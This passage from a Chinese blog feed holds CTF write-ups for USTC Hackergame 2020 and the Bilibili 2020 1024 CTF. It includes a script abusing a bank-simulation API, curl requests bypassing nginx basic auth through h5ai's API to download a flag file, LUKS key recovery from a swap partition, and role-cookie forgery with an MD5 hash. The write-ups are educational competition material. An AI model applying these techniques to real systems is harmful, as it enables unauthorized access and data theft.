class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>......<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.8/29.png\" width=\"1497\" height=\"412\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完.....吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/27.png\" width=\"1150\" height=\"420\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/28.png\" width=\"1146\" height=\"539\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏......」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/18.png\" width=\"824\" height=\"864\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>...... 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 ... 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 ... 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/9.png\" width=\"1165\" height=\"294\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/8.png\" width=\"750\" height=\"400\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/10.png\" width=\"1196\" height=\"270\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/11.png\" width=\"687\" height=\"514\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/12.png\" width=\"1371\" height=\"279\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.9/31.png\" width=\"1109\" height=\"135\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div>USTC Hackergame 2020（中科大信安赛）write up</div>\n<div><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-11-06</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/1.png\" width=\"1901\" height=\"720\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/2.png\" width=\"830\" height=\"301\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/3.png\" width=\"751\" height=\"666\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/4.png\" width=\"1905\" height=\"853\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/5.png\" width=\"431\" height=\"731\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/6.png\" width=\"1899\" height=\"543\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/7.png\" width=\"1901\" height=\"538\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/8.png\" width=\"646\" height=\"46\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/9.png\" width=\"1897\" height=\"512\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 